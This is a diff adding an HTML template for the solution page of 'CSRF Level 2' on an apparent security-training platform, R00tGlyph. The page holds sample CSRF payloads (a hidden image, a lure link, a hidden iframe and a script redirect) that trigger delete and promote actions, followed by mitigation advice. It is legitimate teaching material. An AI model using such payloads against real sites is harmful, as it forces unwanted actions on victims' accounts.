@@ -1,0 +1,84 @@
+{% extends 'base.html' %}
+
+{% block title %}CSRF Level 2 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-10 offset-md-1">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">CSRF Level 2 Solution: GET-based CSRF</h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <h4><i class="bi bi-info-circle-fill me-2"></i>Challenge Overview</h4>
+                    <p>This challenge shows how state-changing operations performed via GET requests are vulnerable to CSRF attacks through simple link clicks or image tags.</p>
+                </div>
+
+                <div class="card mb-4">
+                    <div class="card-header bg-primary text-white">
+                        <h5 class="mb-0"><i class="bi bi-bullseye me-2"></i>Attack Vector</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>The application performs administrative actions through GET requests, making them vulnerable to CSRF via simple HTML elements like images, links, or iframes that automatically trigger when the page loads.</p>
+                    </div>
+                </div>
+
+                <div class="card mb-4">
+                    <div class="card-header bg-warning text-white">
+                        <h5 class="mb-0"><i class="bi bi-tools me-2"></i>Tools Needed</h5>
+                    </div>
+                    <div class="card-body">
+                        <ul>
+
+                            <li>Web browser</li>
+                            <li>Text editor for HTML</li>
+                            <li>Understanding of HTTP methods</li>
+                            <li>Social engineering techniques</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card mb-4">
+                    <div class="card-header bg-success text-white">
+                        <h5 class="mb-0"><i class="bi bi-code-slash me-2"></i>Payload Example</h5>
+                    </div>
+                    <div class="card-body">
+                        <pre class="bg-dark text-light p-3 rounded"><code><!-- Simple image-based CSRF -->
+<img src="http://target.com/csrf/level2?action=delete&user_id=123" width="1" height="1">
+
+<!-- Link-based CSRF -->
+<a href="http://target.com/csrf/level2?action=promote&user_id=456">Click here for free gift!</a>
+
+<!-- Iframe-based CSRF -->
+<iframe src="http://target.com/csrf/level2?action=demote&user_id=789" style="display:none"></iframe>
+
+<!-- JavaScript-based automatic execution -->
+<script>
+window.location = 'http://target.com/csrf/level2?action=delete&user_id=123';
+</script></code></pre>
+                    </div>
+                </div>
+
+                <div class="card mb-4">
+                    <div class="card-header bg-danger text-white">
+                        <h5 class="mb-0"><i class="bi bi-shield-check me-2"></i>Mitigation Strategies</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>Never use GET requests for state-changing operations. Use POST, PUT, or DELETE methods with proper CSRF protection. Implement the principle of least privilege and require explicit confirmation for sensitive actions.</p>
+                    </div>
+                </div>
+
+                <div class="text-center mt-4">
+                    <a href="/csrf/level2" class="btn btn-primary me-2">
+                        <i class="bi bi-arrow-left me-1"></i>Back to Challenge
+                    </a>
+                    <a href="/challenges" class="btn btn-secondary">
+                        <i class="bi bi-list me-1"></i>All Challenges
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
